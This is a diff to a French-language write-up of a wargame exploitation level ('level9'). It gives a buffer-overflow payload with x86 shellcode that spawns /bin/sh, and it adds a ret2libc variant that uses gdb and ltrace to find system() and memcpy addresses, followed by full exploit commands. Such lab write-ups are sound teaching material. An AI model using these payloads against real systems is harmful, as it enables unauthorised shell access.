@@ -25,3 +25,26 @@ L'adresse qui va override EIP en premier doit se trouver après 108 chars. On fa
 Donc le payload final ressemble à
 
 `./level9 $(python -c "print '\x8c\xa1\x04\x08' + 'A' * 104 + '\x0c\xa0\x04\x08' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")`
+
+A noter que:
+Nous pouvons aussi utiliser un ret2libc.
+On va utiliser un appel a system avec comme argument /bin/sh
+
+Pour ce faire nous avons besoin de la localisation de system, on la trouve avec gdb
+`0xb7d86060 <system>`
+
+maintenant nous avons besoin de la taille de notre buffer, celui ci fait 108 caracteres
+et pour finir nous avons besoin de l'adresse renvoyer par memcpy
+grace a ltrace on trouve 0x0804a00c
+
+Avec ceci nous pouvons donc construire notre exploit.
+
+Adresse de system + random caractere doit faire un total de 108 carac
+puis on rajoute l'adresse de notre chaine + ";/bin/sh"
+Notre buffer ressemblera donc exactement a:
+
+`'\x60\x60\xd8\xb7' + 'A'*104 + '\x0c\xa0\x04\x08' + ';/bin/sh'`
+
+A note l'importance du ; avant le /bin/sh car sinon la commande ne sera pas compris et le shell ne sera pas executer
+
+`./level9 $(python -c "print('\x60\x60\xd8\xb7' + 'A'*104 + '\x0c\xa0\x04\x08' + ';/bin/sh')")`
